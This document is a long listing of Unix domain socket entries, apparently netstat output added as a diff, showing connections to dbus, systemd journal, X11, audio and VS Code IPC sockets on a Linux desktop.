+unix  3      [ ]         STREAM     CONNECTED     638993   
+unix  3      [ ]         STREAM     CONNECTED     636334   
+unix  3      [ ]         SEQPACKET  CONNECTED     634763   
+unix  3      [ ]         STREAM     CONNECTED     18298    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     19841    
+unix  3      [ ]         STREAM     CONNECTED     636265   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     636062   
+unix  3      [ ]         STREAM     CONNECTED     18212    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     1015487  
+unix  3      [ ]         STREAM     CONNECTED     638458   
+unix  3      [ ]         SEQPACKET  CONNECTED     631260   
+unix  3      [ ]         STREAM     CONNECTED     18725    
+unix  3      [ ]         STREAM     CONNECTED     656977   
+unix  3      [ ]         STREAM     CONNECTED     69793    
+unix  3      [ ]         STREAM     CONNECTED     18119    
+unix  3      [ ]         STREAM     CONNECTED     646160   
+unix  2      [ ]         STREAM     CONNECTED     623205   
+unix  3      [ ]         STREAM     CONNECTED     16069    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     17986    
+unix  3      [ ]         STREAM     CONNECTED     19476    
+unix  3      [ ]         STREAM     CONNECTED     634477   
+unix  3      [ ]         STREAM     CONNECTED     1684     
+unix  2      [ ]         DGRAM                    1649     
+unix  3      [ ]         STREAM     CONNECTED     14194    
+unix  3      [ ]         STREAM     CONNECTED     633717   
+unix  3      [ ]         STREAM     CONNECTED     623719   
+unix  3      [ ]         STREAM     CONNECTED     18952    
+unix  3      [ ]         STREAM     CONNECTED     17232    
+unix  3      [ ]         STREAM     CONNECTED     1874     /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     636328   
+unix  3      [ ]         STREAM     CONNECTED     17395    /run/user/1000/bus
+unix  3      [ ]         SEQPACKET  CONNECTED     1002845  
+unix  3      [ ]         STREAM     CONNECTED     17358    
+unix  3      [ ]         STREAM     CONNECTED     18083    
+unix  3      [ ]         STREAM     CONNECTED     18773    @/tmp/.ICE-unix/809
+unix  3      [ ]         SEQPACKET  CONNECTED     904388   
+unix  3      [ ]         STREAM     CONNECTED     17116    
+unix  3      [ ]         STREAM     CONNECTED     641071   
+unix  3      [ ]         SEQPACKET  CONNECTED     623717   
+unix  3      [ ]         STREAM     CONNECTED     18981    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     16299    
+unix  2      [ ]         DGRAM                    18972    
+unix  3      [ ]         STREAM     CONNECTED     634476   
+unix  3      [ ]         STREAM     CONNECTED     19869    
+unix  3      [ ]         STREAM     CONNECTED     17028    
+unix  2      [ ]         SEQPACKET  CONNECTED     839802   
+unix  3      [ ]         STREAM     CONNECTED     636203   
+unix  3      [ ]         STREAM     CONNECTED     20541    
+unix  3      [ ]         STREAM     CONNECTED     14070    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     1013965  
+unix  3      [ ]         STREAM     CONNECTED     1005982  
+unix  3      [ ]         STREAM     CONNECTED     634787   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     631262   
+unix  3      [ ]         STREAM     CONNECTED     631140   
+unix  3      [ ]         STREAM     CONNECTED     19578    
+unix  3      [ ]         STREAM     CONNECTED     1017172  /run/user/1000/pulse/native
+unix  2      [ ]         SEQPACKET  CONNECTED     627075   
+unix  3      [ ]         SEQPACKET  CONNECTED     634744   
+unix  3      [ ]         STREAM     CONNECTED     19552    
+unix  3      [ ]         STREAM     CONNECTED     17996    
+unix  2      [ ]         DGRAM                    1894     
+unix  3      [ ]         STREAM     CONNECTED     622929   
+unix  3      [ ]         STREAM     CONNECTED     527629   /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     630752   
+unix  3      [ ]         STREAM     CONNECTED     18989    
+unix  3      [ ]         STREAM     CONNECTED     17163    
+unix  3      [ ]         STREAM     CONNECTED     18707    /run/user/1000/bus
+unix  2      [ ]         DGRAM                    1660     
+unix  3      [ ]         STREAM     CONNECTED     14318    
+unix  3      [ ]         STREAM     CONNECTED     18221    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     18025    
+unix  3      [ ]         STREAM     CONNECTED     18003    
+unix  3      [ ]         STREAM     CONNECTED     19213    
+unix  3      [ ]         STREAM     CONNECTED     18220    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     18115    
+unix  3      [ ]         STREAM     CONNECTED     18841    
+unix  3      [ ]         STREAM     CONNECTED     17826    
+unix  3      [ ]         STREAM     CONNECTED     641072   
+unix  3      [ ]         STREAM     CONNECTED     623710   
+unix  3      [ ]         STREAM     CONNECTED     1015955  
+unix  3      [ ]         STREAM     CONNECTED     904381   
+unix  3      [ ]         STREAM     CONNECTED     1002407  
+unix  3      [ ]         SEQPACKET  CONNECTED     634753   
+unix  3      [ ]         STREAM     CONNECTED     68788    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     18887    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18747    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     1002849  
+unix  3      [ ]         STREAM     CONNECTED     633842   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     636061   
+unix  3      [ ]         STREAM     CONNECTED     18211    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     633831   
+unix  2      [ ]         DGRAM                    19848    
+unix  3      [ ]         STREAM     CONNECTED     18780    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     18921    
+unix  3      [ ]         STREAM     CONNECTED     13873    
+unix  3      [ ]         STREAM     CONNECTED     623220   
+unix  3      [ ]         STREAM     CONNECTED     623207   
+unix  3      [ ]         STREAM     CONNECTED     16514    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     19554    
+unix  3      [ ]         STREAM     CONNECTED     17997    
+unix  3      [ ]         STREAM     CONNECTED     1004220  
+unix  3      [ ]         STREAM     CONNECTED     658444   
+unix  3      [ ]         STREAM     CONNECTED     18724    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     17853    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     66823    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     69796    
+unix  3      [ ]         STREAM     CONNECTED     636310   
+unix  2      [ ]         SEQPACKET  CONNECTED     631763   
+unix  3      [ ]         STREAM     CONNECTED     19810    
+unix  3      [ ]         STREAM     CONNECTED     1002835  
+unix  3      [ ]         STREAM     CONNECTED     17396    
+unix  3      [ ]         STREAM     CONNECTED     18109    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18831    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     17409    
+unix  3      [ ]         DGRAM                    1582     
+unix  3      [ ]         STREAM     CONNECTED     635602   
+unix  3      [ ]         STREAM     CONNECTED     18955    
+unix  3      [ ]         STREAM     CONNECTED     17159    
+unix  3      [ ]         STREAM     CONNECTED     17040    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     771570   /run/user/1000/speech-dispatcher/speechd.sock
+unix  3      [ ]         STREAM     CONNECTED     620269   
+unix  3      [ ]         STREAM     CONNECTED     526762   
+unix  3      [ ]         STREAM     CONNECTED     18919    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     904379   
+unix  2      [ ]         SEQPACKET  CONNECTED     627955   
+unix  3      [ ]         STREAM     CONNECTED     633848   
+unix  3      [ ]         STREAM     CONNECTED     634786   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     636241   
+unix  3      [ ]         STREAM     CONNECTED     19082    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     1013963  
+unix  3      [ ]         STREAM     CONNECTED     634862   
+unix  3      [ ]         STREAM     CONNECTED     624765   
+unix  3      [ ]         SEQPACKET  CONNECTED     621030   
+unix  3      [ ]         STREAM     CONNECTED     18085    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     18197    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     637959   
+unix  3      [ ]         STREAM     CONNECTED     623721   
+unix  3      [ ]         STREAM     CONNECTED     639501   
+unix  3      [ ]         STREAM     CONNECTED     18183    
+unix  3      [ ]         STREAM     CONNECTED     17065    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     18709    /run/systemd/journal/stdout
+unix  3      [ ]         DGRAM                    16787    
+unix  2      [ ]         SEQPACKET  CONNECTED     767726   
+unix  3      [ ]         STREAM     CONNECTED     638017   
+unix  3      [ ]         STREAM     CONNECTED     621919   @/tmp/.X11-unix/X0
+unix  2      [ ]         DGRAM                    754919   
+unix  3      [ ]         SEQPACKET  CONNECTED     656982   
+unix  2      [ ]         SEQPACKET  CONNECTED     766868   
+unix  3      [ ]         STREAM     CONNECTED     17981    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     1002847  
+unix  3      [ ]         STREAM     CONNECTED     19874    
+unix  3      [ ]         STREAM     CONNECTED     20550    
+unix  3      [ ]         STREAM     CONNECTED     18084    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     621960   
+unix  3      [ ]         STREAM     CONNECTED     19693    
+unix  3      [ ]         STREAM     CONNECTED     638012   
+unix  3      [ ]         SEQPACKET  CONNECTED     636305   
+unix  3      [ ]         STREAM     CONNECTED     18848    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     907317   
+unix  3      [ ]         STREAM     CONNECTED     18835    
+unix  2      [ ]         DGRAM                    17454    
+unix  2      [ ]         DGRAM                    1532     
+unix  3      [ ]         STREAM     CONNECTED     17233    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         DGRAM                    13887    
+unix  3      [ ]         STREAM     CONNECTED     638014   
+unix  3      [ ]         SEQPACKET  CONNECTED     621026   
+unix  3      [ ]         STREAM     CONNECTED     17253    
+unix  3      [ ]         STREAM     CONNECTED     18880    
+unix  3      [ ]         STREAM     CONNECTED     18869    
+unix  3      [ ]         STREAM     CONNECTED     17228    
+unix  2      [ ]         DGRAM                    17045    
+unix  3      [ ]         STREAM     CONNECTED     17039    
+unix  3      [ ]         SEQPACKET  CONNECTED     1005979  
+unix  3      [ ]         STREAM     CONNECTED     636217   
+unix  3      [ ]         STREAM     CONNECTED     19581    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     18111    
+unix  3      [ ]         STREAM     CONNECTED     17892    /run/user/1000/bus
+unix  2      [ ]         STREAM     CONNECTED     656863   
+unix  3      [ ]         STREAM     CONNECTED     640018   
+unix  3      [ ]         STREAM     CONNECTED     772999   
+unix  3      [ ]         STREAM     CONNECTED     623709   
+unix  3      [ ]         STREAM     CONNECTED     16708    @/tmp/.X11-unix/X0
+unix  2      [ ]         DGRAM                    15975    
+unix  3      [ ]         STREAM     CONNECTED     18813    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     17915    
+unix  3      [ ]         STREAM     CONNECTED     2037     
+unix  3      [ ]         STREAM     CONNECTED     2000     
+unix  3      [ ]         DGRAM                    1960     
+unix  2      [ ]         DGRAM                    16550    
+unix  3      [ ]         STREAM     CONNECTED     907316   
+unix  3      [ ]         STREAM     CONNECTED     635604   
+unix  3      [ ]         STREAM     CONNECTED     19145    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     18836    @/tmp/.X11-unix/X0
+unix  2      [ ]         SEQPACKET  CONNECTED     649777   
+unix  3      [ ]         SEQPACKET  CONNECTED     631261   
+unix  3      [ ]         STREAM     CONNECTED     620277   /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     19125    
+unix  3      [ ]         STREAM     CONNECTED     1002873  
+unix  3      [ ]         STREAM     CONNECTED     636047   
+unix  3      [ ]         STREAM     CONNECTED     17367    
+unix  3      [ ]         STREAM     CONNECTED     19586    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     17929    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18763    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     69794    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     18320    
+unix  3      [ ]         STREAM     CONNECTED     18116    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     641069   
+unix  3      [ ]         STREAM     CONNECTED     638011   
+unix  3      [ ]         STREAM     CONNECTED     633854   
+unix  3      [ ]         STREAM     CONNECTED     633815   
+unix  3      [ ]         STREAM     CONNECTED     635904   
+unix  3      [ ]         SEQPACKET  CONNECTED     621029   
+unix  3      [ ]         STREAM     CONNECTED     18973    
+unix  3      [ ]         STREAM     CONNECTED     17236    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     17059    
+unix  3      [ ]         STREAM     CONNECTED     636242   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18842    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     14069    
+unix  3      [ ]         DGRAM                    13888    
+unix  3      [ ]         STREAM     CONNECTED     18027    
+unix  3      [ ]         STREAM     CONNECTED     1013839  
+unix  3      [ ]         STREAM     CONNECTED     19030    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     19816    
+unix  2      [ ]         STREAM     CONNECTED     1013654  
+unix  3      [ ]         STREAM     CONNECTED     656986   
+unix  3      [ ]         STREAM     CONNECTED     18844    
+unix  2      [ ]         SEQPACKET  CONNECTED     838871   
+unix  3      [ ]         STREAM     CONNECTED     19576    
+unix  3      [ ]         STREAM     CONNECTED     528477   /run/user/1000/gvfsd/socket-1F37M9oJ
+unix  3      [ ]         STREAM     CONNECTED     14320    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     18342    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     19877    
+unix  3      [ ]         STREAM     CONNECTED     1619     
+unix  3      [ ]         SEQPACKET  CONNECTED     1002846  
+unix  3      [ ]         STREAM     CONNECTED     636044   
+unix  3      [ ]         STREAM     CONNECTED     17398    
+unix  3      [ ]         STREAM     CONNECTED     17365    
+unix  3      [ ]         STREAM     CONNECTED     18108    
+unix  3      [ ]         STREAM     CONNECTED     1005983  
+unix  3      [ ]         STREAM     CONNECTED     634760   
+unix  3      [ ]         STREAM     CONNECTED     631265   
+unix  3      [ ]         STREAM     CONNECTED     631253   
+unix  3      [ ]         STREAM     CONNECTED     636899   
+unix  3      [ ]         STREAM     CONNECTED     656974   
+unix  2      [ ]         SEQPACKET  CONNECTED     656038   
+unix  3      [ ]         STREAM     CONNECTED     18755    
+unix  3      [ ]         STREAM     CONNECTED     623209   
+unix  3      [ ]         STREAM     CONNECTED     623708   
+unix  3      [ ]         STREAM     CONNECTED     19219    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     19068    @/tmp/.ICE-unix/809
+unix  3      [ ]         STREAM     CONNECTED     1005981  
+unix  3      [ ]         STREAM     CONNECTED     636261   
+unix  3      [ ]         STREAM     CONNECTED     19808    
+unix  3      [ ]         STREAM     CONNECTED     19807    
+unix  3      [ ]         STREAM     CONNECTED     17115    /run/user/1000/bus
+unix  2      [ ]         SEQPACKET  CONNECTED     669993   
+unix  3      [ ]         STREAM     CONNECTED     14319    
+unix  3      [ ]         STREAM     CONNECTED     13943    
+unix  3      [ ]         STREAM     CONNECTED     633832   /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     17351    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     17231    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     17160    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18630    /run/dbus/system_bus_socket
+unix  2      [ ]         DGRAM                    16946    
+unix  3      [ ]         STREAM     CONNECTED     621924   /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     619514   
+unix  3      [ ]         STREAM     CONNECTED     19583    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     16791    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     19553    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     17824    
+unix  3      [ ]         STREAM     CONNECTED     17043    /run/user/1000/pipewire-0
+unix  3      [ ]         STREAM     CONNECTED     17793    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     1004221  
+unix  3      [ ]         STREAM     CONNECTED     18776    
+unix  3      [ ]         STREAM     CONNECTED     640030   
+unix  2      [ ]         DGRAM                    69791    
+unix  3      [ ]         STREAM     CONNECTED     1005980  
+unix  3      [ ]         STREAM     CONNECTED     18325    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     636218   
+unix  3      [ ]         STREAM     CONNECTED     18978    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18180    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     18102    
+unix  3      [ ]         SEQPACKET  CONNECTED     635868   
+unix  3      [ ]         SEQPACKET  CONNECTED     623718   
+unix  3      [ ]         DGRAM                    1583     
+unix  3      [ ]         STREAM     CONNECTED     18913    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     18158    
+unix  3      [ ]         STREAM     CONNECTED     623712   
+unix  3      [ ]         STREAM     CONNECTED     18723    
+unix  3      [ ]         SEQPACKET  CONNECTED     904389   
+unix  3      [ ]         SEQPACKET  CONNECTED     623215   
+unix  3      [ ]         STREAM     CONNECTED     18047    
+unix  3      [ ]         STREAM     CONNECTED     1013966  
+unix  3      [ ]         STREAM     CONNECTED     18983    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     19580    
+unix  3      [ ]         STREAM     CONNECTED     637999   
+unix  3      [ ]         STREAM     CONNECTED     636309   
+unix  3      [ ]         STREAM     CONNECTED     630753   
+unix  2      [ ]         SEQPACKET  CONNECTED     623742   
+unix  3      [ ]         STREAM     CONNECTED     18970    
+unix  3      [ ]         STREAM     CONNECTED     17248    
+unix  3      [ ]         STREAM     CONNECTED     688250   
+unix  3      [ ]         STREAM     CONNECTED     17451    
+unix  3      [ ]         STREAM     CONNECTED     16501    /run/systemd/journal/stdout
+unix  3      [ ]         DGRAM                    14106    
+unix  3      [ ]         STREAM     CONNECTED     19556    
+unix  3      [ ]         STREAM     CONNECTED     18737    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     19478    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     17828    
+unix  3      [ ]         STREAM     CONNECTED     1992     
+unix  3      [ ]         STREAM     CONNECTED     16440    
+unix  2      [ ]         SEQPACKET  CONNECTED     664882   
+unix  3      [ ]         STREAM     CONNECTED     623219   
+unix  3      [ ]         STREAM     CONNECTED     16068    
+unix  3      [ ]         STREAM     CONNECTED     904393   
+unix  3      [ ]         SEQPACKET  CONNECTED     656983   
+unix  3      [ ]         STREAM     CONNECTED     658705   
+unix  3      [ ]         STREAM     CONNECTED     631256   
+unix  3      [ ]         STREAM     CONNECTED     527608   /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     1002878  
+unix  3      [ ]         STREAM     CONNECTED     1002876  
+unix  3      [ ]         STREAM     CONNECTED     638016   
+unix  3      [ ]         STREAM     CONNECTED     19868    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     17353    
+unix  3      [ ]         STREAM     CONNECTED     18106    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     1013976  
+unix  3      [ ]         STREAM     CONNECTED     624766   
+unix  3      [ ]         STREAM     CONNECTED     18262    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     635596   /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     20549    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     641074   
+unix  3      [ ]         STREAM     CONNECTED     623210   
+unix  3      [ ]         STREAM     CONNECTED     18232    
+unix  3      [ ]         STREAM     CONNECTED     18207    
+unix  2      [ ]         SEQPACKET  CONNECTED     678620   
+unix  3      [ ]         STREAM     CONNECTED     640017   
+unix  3      [ ]         STREAM     CONNECTED     656984   
+unix  3      [ ]         STREAM     CONNECTED     18028    @/tmp/.ICE-unix/809
+unix  3      [ ]         STREAM     CONNECTED     1004202  
+unix  2      [ ]         SEQPACKET  CONNECTED     774961   
+unix  3      [ ]         STREAM     CONNECTED     17930    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     18726    
+unix  2      [ ]         SEQPACKET  CONNECTED     801938   
+unix  3      [ ]         STREAM     CONNECTED     656978   
+unix  3      [ ]         STREAM     CONNECTED     638018   
+unix  3      [ ]         STREAM     CONNECTED     17240    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     773610   
+unix  3      [ ]         STREAM     CONNECTED     639857   
+unix  3      [ ]         STREAM     CONNECTED     633850   
+unix  3      [ ]         STREAM     CONNECTED     19507    
+unix  3      [ ]         STREAM     CONNECTED     1002850  
+unix  3      [ ]         STREAM     CONNECTED     633548   /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     16503    /run/systemd/journal/stdout
+unix  2      [ ]         DGRAM                    14101    
+unix  3      [ ]         STREAM     CONNECTED     637177   /run/user/1000/vscode-ipc-7ef8de94-cdb0-4465-af1f-0fadc4d84c59.sock
+unix  3      [ ]         STREAM     CONNECTED     638008   
+unix  3      [ ]         STREAM     CONNECTED     636307   
+unix  3      [ ]         STREAM     CONNECTED     636929   
+unix  3      [ ]         STREAM     CONNECTED     18977    
+unix  3      [ ]         STREAM     CONNECTED     20544    
+unix  3      [ ]         STREAM     CONNECTED     19819    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     18081    
+unix  3      [ ]         STREAM     CONNECTED     17189    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     1015956  
+unix  3      [ ]         STREAM     CONNECTED     636898   
+unix  3      [ ]         STREAM     CONNECTED     639367   
+unix  3      [ ]         STREAM     CONNECTED     19211    /run/user/1000/bus
+unix  2      [ ]         STREAM     CONNECTED     623707   
+unix  3      [ ]         STREAM     CONNECTED     19477    
+unix  3      [ ]         STREAM     CONNECTED     17792    
+unix  3      [ ]         STREAM     CONNECTED     16441    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     20540    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     18209    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     19582    /run/user/1000/bus
+unix  3      [ ]         SEQPACKET  CONNECTED     1013972  
+unix  3      [ ]         SEQPACKET  CONNECTED     634762   
+unix  3      [ ]         STREAM     CONNECTED     631252   
+unix  3      [ ]         STREAM     CONNECTED     1002839  
+unix  3      [ ]         STREAM     CONNECTED     636065   
+unix  3      [ ]         STREAM     CONNECTED     19818    
+unix  3      [ ]         STREAM     CONNECTED     17916    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     18636    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     18708    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     18694    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     2001     
+unix  3      [ ]         DGRAM                    1959     
+unix  3      [ ]         STREAM     CONNECTED     773625   /run/user/1000/pulse/native
+unix  3      [ ]         STREAM     CONNECTED     623217   
+unix  3      [ ]         STREAM     CONNECTED     623208   
+unix  3      [ ]         STREAM     CONNECTED     18233    /run/user/1000/bus
+unix  2      [ ]         DGRAM                    16052    
+unix  3      [ ]         STREAM     CONNECTED     632808   /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     18953    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     19558    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     16945    
+unix  3      [ ]         STREAM     CONNECTED     623722   
+unix  3      [ ]         STREAM     CONNECTED     17361    
+unix  3      [ ]         STREAM     CONNECTED     18845    
+unix  3      [ ]         STREAM     CONNECTED     18781    
+unix  2      [ ]         DGRAM                    1439     
+unix  3      [ ]         STREAM     CONNECTED     19155    
+unix  3      [ ]         STREAM     CONNECTED     19579    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     17129    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     1002877  
+unix  3      [ ]         STREAM     CONNECTED     904390   
+unix  3      [ ]         STREAM     CONNECTED     904382   
+unix  3      [ ]         STREAM     CONNECTED     639858   
+unix  3      [ ]         STREAM     CONNECTED     620275   
+unix  3      [ ]         STREAM     CONNECTED     619516   @/tmp/.ICE-unix/809
+unix  3      [ ]         STREAM     CONNECTED     19519    
+unix  2      [ ]         DGRAM                    17829    
+unix  2      [ ]         DGRAM                    16030    
+unix  3      [ ]         STREAM     CONNECTED     19590    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     638000   
+unix  3      [ ]         STREAM     CONNECTED     633716   
+unix  3      [ ]         STREAM     CONNECTED     17357    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     19544    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     634443   
+unix  3      [ ]         DGRAM                    14108    
+unix  2      [ ]         STREAM     CONNECTED     1002871  
+unix  3      [ ]         STREAM     CONNECTED     636270   
+unix  3      [ ]         STREAM     CONNECTED     19214    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     1013977  
+unix  3      [ ]         SEQPACKET  CONNECTED     1005978  
+unix  3      [ ]         STREAM     CONNECTED     634861   
+unix  3      [ ]         STREAM     CONNECTED     625128   
+unix  2      [ ]         DGRAM                    19128    
+unix  3      [ ]         STREAM     CONNECTED     623218   
+unix  3      [ ]         STREAM     CONNECTED     18308    
+unix  3      [ ]         STREAM     CONNECTED     16042    
+unix  3      [ ]         STREAM     CONNECTED     635594   
+unix  3      [ ]         STREAM     CONNECTED     19480    
+unix  3      [ ]         STREAM     CONNECTED     19548    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     19539    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     656976   
+unix  3      [ ]         STREAM     CONNECTED     17370    
+unix  3      [ ]         STREAM     CONNECTED     19592    
+unix  3      [ ]         STREAM     CONNECTED     18105    
+unix  3      [ ]         STREAM     CONNECTED     18095    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     19863    
+unix  3      [ ]         STREAM     CONNECTED     14322    /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     1652     
+unix  3      [ ]         STREAM     CONNECTED     1629     /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     638013   
+unix  3      [ ]         STREAM     CONNECTED     637958   
+unix  3      [ ]         STREAM     CONNECTED     636043   @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18178    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     18949    /run/systemd/journal/stdout
+unix  3      [ ]         STREAM     CONNECTED     17041    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     633847   
+unix  3      [ ]         STREAM     CONNECTED     636940   
+unix  2      [ ]         SEQPACKET  CONNECTED     620462   
+unix  3      [ ]         STREAM     CONNECTED     17883    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     904391   
+unix  3      [ ]         STREAM     CONNECTED     17114    
+unix  3      [ ]         STREAM     CONNECTED     1013967  
+unix  3      [ ]         STREAM     CONNECTED     636329   
+unix  3      [ ]         STREAM     CONNECTED     18272    /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     638015   
+unix  3      [ ]         STREAM     CONNECTED     18222    /tmp/dbus-VtoGV3BGue
+unix  3      [ ]         STREAM     CONNECTED     688251   /run/dbus/system_bus_socket
+unix  3      [ ]         STREAM     CONNECTED     634742   /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     19875    /run/user/1000/gvfsd/socket-iEWGzgKN
+unix  3      [ ]         STREAM     CONNECTED     19584    /run/user/1000/bus
+unix  2      [ ]         DGRAM                    13883    
+unix  3      [ ]         STREAM     CONNECTED     18784    @/tmp/.X11-unix/X0
+unix  3      [ ]         STREAM     CONNECTED     17021    
+unix  3      [ ]         STREAM     CONNECTED     639500   
+unix  3      [ ]         STREAM     CONNECTED     636939   
+unix  3      [ ]         STREAM     CONNECTED     2034     
+unix  3      [ ]         STREAM     CONNECTED     2003     /run/user/1000/bus
+unix  3      [ ]         STREAM     CONNECTED     790460   /run/user/1000/gvfsd/socket-EPfdbnS3
+unix  3      [ ]         STREAM     CONNECTED     528476   
+unix  3      [ ]         STREAM     CONNECTED     18224    
+unix  3      [ ]         STREAM     CONNECTED     656973   
+unix  3      [ ]         STREAM     CONNECTED     1004203  
+unix  2      [ ]         SEQPACKET  CONNECTED     830116   
+unix  3      [ ]         STREAM     CONNECTED     17992    @/tmp/.ICE-unix/809
+unix  3      [ ]         STREAM     CONNECTED     18670    
+unix  3      [ ]         STREAM     CONNECTED     68786    
+unix  3      [ ]         STREAM     CONNECTED     18104    
+unix  3      [ ]         STREAM     CONNECTED     18094    
+unix  3      [ ]         STREAM     CONNECTED     1002837  
